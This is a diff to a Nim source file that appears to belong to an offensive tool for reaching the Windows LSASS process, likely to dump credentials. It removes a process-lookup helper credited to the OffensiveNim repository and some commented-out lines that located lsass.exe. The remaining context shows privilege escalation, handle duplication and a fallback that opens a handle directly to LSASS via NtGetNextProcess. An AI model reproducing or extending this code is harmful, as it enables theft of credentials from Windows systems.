@@ -20,33 +20,6 @@ proc isElevatedProcess(): bool =
     CloseHandle(token)
     return isElevated
 
-# Appropriated from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
-proc toString(chars: openArray[WCHAR]): string =
-    result = ""
-    for c in chars:
-        if cast[char](c) == '\0':
-            break
-        result.add(cast[char](c))
-
-# Appropiated from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
-proc GetProcessByName(process_name: string): DWORD =
-    var
-        pid: DWORD = 0
-        entry: PROCESSENTRY32
-        hSnapshot: HANDLE
-
-    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    defer: CloseHandle(hSnapshot)
-
-    if Process32First(hSnapshot, addr entry):
-        while Process32Next(hSnapshot, addr entry):
-            if entry.szExeFile.toString == process_name:
-                pid = entry.th32ProcessID
-                break
-
-    return pid
-
 proc SetPrivilege(hToken: HANDLE, lpszPrivilege: LPCTSTR, bEnablePrivilege: BOOL): bool =
     var
         tp: TOKEN_PRIVILEGES
@@ -218,10 +191,6 @@ when isMainModule:
 
     if dupHandlesSeq.len == 0:
         echo "\n[-] No Suitable Handles Could Be Duplicated.\n[!] Attempting Risky Operation: Opening Handle Directly to Lsass Process...\n"
-        #echo "[!] Finding PID"
-        #pid = GetProcessByName("lsass.exe")
-        #echo "[!] PID: ", pid
-        #echo "\n[!] Getting Handle to Process..."
 
         while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
             #echo "Loop: ", count
